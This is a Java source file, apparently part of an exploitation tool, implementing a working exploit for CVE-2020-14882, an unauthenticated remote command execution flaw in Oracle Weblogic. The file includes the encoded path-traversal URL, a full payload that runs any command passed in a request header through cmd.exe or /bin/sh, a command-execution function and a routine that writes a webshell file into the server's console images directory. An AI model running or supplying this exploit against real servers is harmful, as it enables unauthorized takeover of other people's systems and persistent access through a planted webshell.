package fun.fireline.core;

import fun.fireline.tools.HttpTool;
import fun.fireline.tools.Tools;

import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/3/25 22:49
 * @github https://github.com/yhy0
 * 编写EXP 示例文件
 * Weblogic 未授权命令执行
 */

public class CVE_2020_14882 implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;

    private static final String VULURL = "/console/css/%252e%252e%252fconsole.portal";
    private static final String PAYLOAD = ("_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\"); String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd}; if (cmd != null) { String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(\"\"); }executeThread.interrupt(); \");");


    public CVE_2020_14882() {

    }

    public boolean checkVUL(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();
        String path = url + VULURL;
        try {

            HashMap<String, String> map = new HashMap();       //请求headers
            // 设置 header ，执行命令
            map.put("cmd", "echo " + uuid);

            String result = HttpTool.postHttpReuest(path, PAYLOAD, "UTF-8", map, "application/x-www-form-urlencoded");

            System.out.println("result ");
            System.out.println(result);

            boolean flag = result.contains(uuid);

            if(flag) {
                this.isVul = true;
            }

            return flag;

        } catch (Exception e) {
            logger.error(e.getStackTrace());
        }

        return false;
    }

    public String exeCMD(String cmd, String encoding)  {

        String path = this.target + VULURL;
        try {
            HashMap<String, String> map = new HashMap();       //请求headers
            // 设置 header ，执行命令
            map.put("cmd", cmd);
            System.out.println(cmd);
            String result = HttpTool.postHttpReuest(path, PAYLOAD, encoding, map, "application/x-www-form-urlencoded");

            return result + "\r\n 命令执行成功";

        } catch (Exception e) {
            logger.error(e.getStackTrace());
        }
        return "命令执行失败";
    }

    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        // 因为使用echo 写 shell ，这里需要对 < > 转义
        String shell_info = Tools.get_escape_shell(fileContent, platform);

        System.out.println(shell_info);
        String path = this.getWebPath();

        String cmd = String.format("echo %s > %s", shell_info, path + filename);
        System.out.println(cmd);
        String str = this.exeCMD(cmd, "UTF-8");
        System.out.println("\r\n");
        System.out.println(str);

        if(this.target.endsWith("/")) {
            return this.target + "console/images/" + filename;
        } else {
            return this.target + "/console/images/" + filename;
        }

    }

    public String getWebPath() {
        // 根据不同的服务，查找对应的web路径

        // 这个CVE-2020-14882 我直接写死 路径 演示使用

        return "../../../wlserver/server/lib/consoleapp/webapp/images/";
    }

    public boolean isVul() {
        return this.isVul;
    }
}
